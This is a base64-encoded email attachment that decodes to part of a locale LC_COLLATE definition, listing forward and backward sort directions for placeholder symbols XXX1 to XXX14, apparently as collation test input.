CjxYWFgxNC8+PmZvcndhcmQ7Zm9yd2FyZDtmb3J3YXJkO2ZvcndhcmQ7Zm9yd2FyZDtmb3J3YXJk
O2ZvcndhcmQ7YmFja3dhcmQNCjxYWFgxMy8+PmJhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2Jh
Y2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2ZvcndhcmQNCjxYWFgxMi8+PmZvcndh
cmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7
Zm9yd2FyZA0KPFhYWDExLz4+YmFja3dhcmQ7Zm9yd2FyZDtiYWNrd2FyZDtiYWNrd2FyZDtiYWNr
d2FyZDtiYWNrd2FyZDtiYWNrd2FyZDtmb3J3YXJkDQo8WFhYMTAvPj5mb3J3YXJkO2ZvcndhcmQ7
YmFja3dhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7Zm9yd2FyZA0KPFhY
WDkvPj5iYWNrd2FyZDtiYWNrd2FyZDtmb3J3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJk
O2JhY2t3YXJkO2ZvcndhcmQNCjxYWFg4Lz4+Zm9yd2FyZDtiYWNrd2FyZDtmb3J3YXJkO2JhY2t3
YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2ZvcndhcmQNCjxYWFg3Lz4+YmFja3dhcmQ7
Zm9yd2FyZDtmb3J3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2Zvcndh
cmQNCjxYWFg2Lz4+Zm9yd2FyZDtmb3J3YXJkO2ZvcndhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFj
a3dhcmQ7YmFja3dhcmQ7Zm9yd2FyZA0KPFhYWDUvPj5iYWNrd2FyZDtiYWNrd2FyZDtiYWNrd2Fy
ZDtmb3J3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2ZvcndhcmQNCjxYWFg0Lz4+Zm9y
d2FyZDtiYWNrd2FyZDtiYWNrd2FyZDtmb3J3YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2JhY2t3YXJk
O2ZvcndhcmQNCjxYWFgzLz4+YmFja3dhcmQ7Zm9yd2FyZDtiYWNrd2FyZDtmb3J3YXJkO2JhY2t3
YXJkO2JhY2t3YXJkO2JhY2t3YXJkO2ZvcndhcmQNCjxYWFgyLz4+Zm9yd2FyZDtmb3J3YXJkO2Jh
Y2t3YXJkO2ZvcndhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7Zm9yd2FyZA0KPFhYWDEv
Pj5iYWNrd2FyZDtiYWNrd2FyZDtmb3J3YXJkO2ZvcndhcmQ7YmFja3dhcmQ7YmFja3dhcmQ7YmFj
a3dhcmQ7Zm9yd2FyZA0KcmVvcmRlci1zZWN0aW9ucy1lbmQNCkVORCBMQ19DT0xMQVRFDQo=

--_002_20250122134128GA29327localhostlocaldomain_--
